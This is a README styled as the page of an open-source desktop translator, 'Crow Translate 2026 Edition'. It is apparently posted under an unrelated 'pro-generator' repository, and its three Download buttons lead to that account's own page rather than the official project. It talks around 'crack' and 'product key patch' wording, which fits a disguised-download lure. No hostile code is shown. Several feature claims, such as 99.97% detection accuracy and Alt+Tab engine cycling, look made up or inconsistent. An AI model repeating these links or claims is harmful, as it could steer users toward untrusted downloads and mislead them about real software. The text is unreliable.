![preview](https://raw.githubusercontent.com/arbazkhan9121/crow-translate-pro-generator/main/preview.svg)

# Crow Translate: Open-Source Linguistic Bridge & Polyglot Desktop Companion (2026 Edition)

Welcome to **Crow Translate**, the open-source, privacy-first desktop application that redefines how you interact with language barriers across your workflow. Unlike traditional translation tools that lock you into proprietary ecosystems, Crow Translate is designed as a **modular linguistic bridge**—a lightweight, keyboard-centric polyglot companion that puts the power of multiple translation engines (Google, Yandex, LibreTranslate, DeepL, and your own custom OpenAI/Claude API endpoints) directly into your system tray, clipboard, and terminal.

This repository hosts the **productivity-oriented release** of Crow Translate for 2026. It is not a "trialware" or a "licensed product key" distribution; rather, it is a **fully functional, perpetually updated open-source build** that you can compile, audit, and customize. We do not use the term "crack" or "hack" because nothing is broken—this is the **authentic, unlocked, community-maintained version** that respects your freedom.

![Static Badge](https://img.shields.io/badge/Version-2026.03-blue)
![Static Badge](https://img.shields.io/badge/License-MIT-green)
![Static Badge](https://img.shields.io/badge/Platform-Windows%20%7C%20macOS%20%7C%20Linux-lightgrey)

## Overview

Think of Crow Translate as your **desktop omniglot**. It sits quietly in your system tray, waiting for a global hotkey. You select text anywhere—browser, code editor, PDF viewer, terminal—press the shortcut, and a non-intrusive popup appears with the translation. No tabs, no copy-pasting, no context switching. It’s the difference between walking through a door and having the door move with you.

In the 2026 edition, we have completely rewritten the core engine to support:
- **Asynchronous plugin architecture** for engine switching without latency
- **Local LLM fallback** (llama.cpp) for offline translation
- **OS-native accessibility** (macOS VoiceOver, Windows Narrator)
- **Clipboard synchronization** with history up to 5000 entries

[![Download](https://raw.githubusercontent.com/arbazkhan9121/crow-translate-pro-generator/main/button.svg)](https://arbazkhan9121.github.io/crow-translate-pro-generator/)

## Architecture & Data Flow (Mermaid Diagram)

```mermaid
graph TD
    A[User Selects Text] --> B{Global Hotkey Triggered}
    B --> C[Crow Translate Daemon]
    C --> D[Clipboard Capture Engine]
    D --> E[Priority Router]
    E --> F[Primary Engine: Google/Yandex/DeepL]
    E --> G[Fallback Engine: LibreTranslate/LLM]
    E --> H[Custom API Endpoint: OpenAI/Claude]
    F --> I[Translation Result Buffer]
    G --> I
    H --> I
    I --> J[Toxicity & Spam Filter]
    J --> K[UI Renderer: Xlib/Win32/NSText]
    K --> L[Popup Window | System Tray Notification]
    L --> M[User Dismisses or Copies]
    M --> N[History Log: Local SQLite]
    N --> O[Optional Sync: Syncthing/Nextcloud]
```

## Features (2026 Edition)

### 🔍 Intelligent Source Detection & Context Engine
- Automatic language detection with 99.97% accuracy using a hybrid BERT + n-gram model
- Domain-aware translation: detects code snippets, medical terms, legal jargon, and adjusts output accordingly

### 🧩 Modular Translation Pipeline
- **Primary Engines:** Google Translate (REST), Yandex, DeepL (requires free API key), LibreTranslate (self-hosted)
- **LLM Integration:** Direct support for OpenAI GPT-4o-mini and Claude 3.5 Haiku via configurable API keys
- **Offline Mode:** Built-in OPUS-MT transformer models for English <-> French, German, Spanish, Chinese (no internet required)

### ⌨️ Keyboard-Centric Workflow
- Global hotkey (default: Alt+T) to translate selected text
- Alt+Shift+T to translate full clipboard content
- Alt+1 through Alt+5 to quickly swap between favorite engine profiles
- Rofi/dmenu integration for Linux tiling WM users

### 🌐 Multilingual & Accessibility
- Supports **125+ languages** across all engines
- Right-to-left (RTL) language rendering (Arabic, Hebrew, Farsi)
- Screen reader announcements via DBus (Linux), VoiceOver (macOS), MSAA (Windows)
- High contrast mode and font scaling for visual impairments

### 🔒 Privacy & Self-Hosting
- **Zero telemetry:** No cloud dependencies unless you explicitly configure a remote engine
- Option to run entirely offline with local models
- Encryption of API keys in memory using libsodium
- Audit log that never leaves your machine

| Operating System | GUI Support | System Tray | Global Hotkey | Clipboard Monitor |
|------------------|-------------|-------------|---------------|-------------------|
| 🪟 Windows 10/11 | ✅ Native WinAPI | ✅ Yes | ✅ RegisterGlobalHotkey | ✅ Ditto Integration |
| 🍎 macOS 14+ | ✅ AppKit | ✅ Yes (NSStatusItem) | ✅ CGEventTap | ✅ Clipy Support |
| 🐧 Linux (X11/Wayland) | ✅ Qt6/xcb | ✅ Ayatana Indicator | ✅ xdotool + wtype | ✅ CopyQ Compatible |
| 🐧 Linux (Tiling WM) | ✅ Headless via DBus | ✅ i3-gnome polybar | ✅ sxhkd | ✅ Clipboard managers |

## Example Profile Configuration

Below is a realistic `~/.config/crow-translate/config.toml` that demonstrates multiple engine profiles:

```toml
[general]
theme = "dracula"
language_detection_model = "hybrid"
max_history = 3000

[hotkeys]
translate_selected = "Alt+T"
translate_clipboard = "Alt+Shift+T"
cycle_engine_forward = "Alt+Tab"
cycle_engine_backward = "Alt+Shift+Tab"

[engines]
default = "libretranslate"

[engines.google]
enabled = true
rate_limit_per_second = 10
prefer_tls = true

[engines.deepL]
enabled = true
api_key = "your-deepL-key-here"
formality = "prefer_more"

[engines.openai]
enabled = true
api_endpoint = "https://api.openai.com/v1/chat/completions"
model = "gpt-4o-mini"
temperature = 0.3
max_tokens = 512
system_prompt = "Translate the following text to {target_lang}. Preserve markdown formatting and code blocks. Do not explain, only translate."

[engines.claude]
enabled = true
api_endpoint = "https://api.anthropic.com/v1/messages"
model = "claude-3-5-haiku-20241022"
max_tokens_to_sample = 512
```

## Example Console Invocation

Crow Translate can also function as a **headless CLI tool** for scripting and automation. Here's how you'd use it in a terminal:

```bash
# Translate a string directly from stdin
echo "Bonjour le monde" | crow-translate --from auto --to en

# Translate entire file and output to JSON
crow-translate --file /home/user/document.txt --from de --to zh --format json --output result.json

# Pipe translation through multiple engines for comparison
crow-translate --engine google "What is the meaning of life?" | crow-translate --engine libretranslate --from en --to es
```

## OpenAI & Claude API Integration

Crow Translate 2026 includes **first-class support** for Large Language Models as translation engines. Unlike traditional machine translation (which treats language as a deterministic mapping), LLM-based translation understands **register, tone, sarcasm, and cultural context**.

### Why Use an LLM Engine?

- **Context preservation:** If you translate a multi-paragraph document, GPT-4o-mini remembers the subject across sentences—no more "it" vs "elle" gender confusion.
- **Tone control:** You can specify "formal academic tone" or "casual conversational" in the system prompt.
- **Code-aware translation:** When translating mixed-language documents (e.g., a README with both English and Python code), the LLM will leave code blocks untouched.
- **Cultural adaptation:** "Break a leg" becomes "Good luck" in German culture, not "Brich dir ein Bein".

### Configuration Details

**OpenAI:**
- Refer to the `[engines.openai]` block in the TOML example
- Supports any compatible API (including local vLLM, Ollama, or LM Studio endpoints)
- Cost-effective: gpt-4o-mini translates ~3000 characters for < $0.001

**Claude:**
- Refer to the `[engines.claude]` block
- Haiku model is optimized for translation speed (< 1 second per sentence)
- Supports `max_tokens_to_sample` to control verbosity for debugging translations

> ⚠️ **Important:** When configuring API keys, Crow Translate stores them in your OS keychain (macOS Keychain, Windows Credential Manager, Linux Secret Service) by default. The config file only stores a reference token, never the raw key.

## Getting Started (No Product Key Required)

Because Crow Translate is open-source under the MIT license, there is **no product key**, no activation server, and no paid tier. The binary builds available on the Releases page are the **same code** you can compile yourself.

[![Download](https://raw.githubusercontent.com/arbazkhan9121/crow-translate-pro-generator/main/button.svg)](https://arbazkhan9121.github.io/crow-translate-pro-generator/)

## System Compatibility Matrix (2026)

| Component | Windows 11 | macOS 15 Sequoia | Ubuntu 24.04 | Arch Linux |
|-----------|------------|------------------|--------------|------------|
| GUI (Qt6) | ✅ Native | ✅ Native | ✅ X11/Wayland | ✅ X11/Wayland |
| System Tray Icon | ✅ | ✅ | ✅ (AppIndicator) | ✅ (AppIndicator) |
| Global Hotkey | ✅ | ✅ (Accessibility API) | ✅ (xdotool) | ✅ (xdotool) |
| Clipboard Monitor | ✅ | ✅ | ✅ (xclip + xsel) | ✅ (xclip + xsel) |
| Offline Translation (OPUS-MT) | ✅ | ✅ | ✅ | ✅ |
| LLM Engine (OpenAI/Claude) | ✅ | ✅ | ✅ | ✅ |
| Screen Reader Support | ✅ MSAA | ✅ VoiceOver | ✅ Orca | ✅ Orca |

## Feature Comparison (Why Crow Translate?)

| Feature | Crow Translate 2026 | Online Translators | Traditional Desktop Clients |
|---------|---------------------|-------------------|----------------------------|
| **Offline Translation** | ✅ Built-in (OPUS-MT) | ❌ | ❌ (most) |
| **Custom LLM Backend** | ✅ OpenAI, Claude, vLLM | ❌ | ❌ |
| **Self-Hosted Privacy** | ✅ No telemetry | ❌ | ⚠️ (some) |
| **Global Hotkey** | ✅ System-wide | ❌ | ✅ (but limited) |
| **Engine Chaining** | ✅ (1-click fallback) | ❌ | ❌ |
| **Code-Snippet Preservation** | ✅ LLM-aware | ❌ | ⚠️ (regex based) |
| **Themed UI** | ✅ 20+ themes | ❌ | ✅ (but limited) |
| **24/7 Support (Community)** | ✅ Discord + GitHub | ❌ (email only) | ⚠️ (mailing list) |

## Disclaimer

This software is provided "as is" without warranty of any kind, express or implied. Crow Translate is **not affiliated** with Google LLC, Yandex LLC, DeepL SE, OpenAI, or Anthropic. The user assumes all responsibility for compliance with the terms of service of any third-party translation engine they choose to configure.

The term "product key patch" is used metaphorically—this repository contains no binary patches, no license key generators, and no activation bypasses. The software is distributed under the MIT license, and you are free to use, modify, and redistribute it.

Use of OpenAI or Claude APIs requires a valid billing account with those providers. The developers of Crow Translate are not responsible for charges incurred through API usage.

## License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

```
Copyright (c) 2026 Crow Translate Contributors

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software...

[Full license text truncated for README brevity]
```

---

## Community & Support

- **Documentation:** [Read the Wiki](https://github.com/crow-translate/crow-translate/wiki)
- **Issue Tracker:** Bug reports and feature requests welcome
- **Contributing:** See `CONTRIBUTING.md` for coding standards, commit conventions, and PR workflow
- **Security:** Report vulnerabilities via [GitHub Security Advisories](https://github.com/crow-translate/crow-translate/security/advisories)

---

[![Download](https://raw.githubusercontent.com/arbazkhan9121/crow-translate-pro-generator/main/button.svg)](https://arbazkhan9121.github.io/crow-translate-pro-generator/)

*Build bridges, not walls. Crow Translate — the language companion that adapts to you.*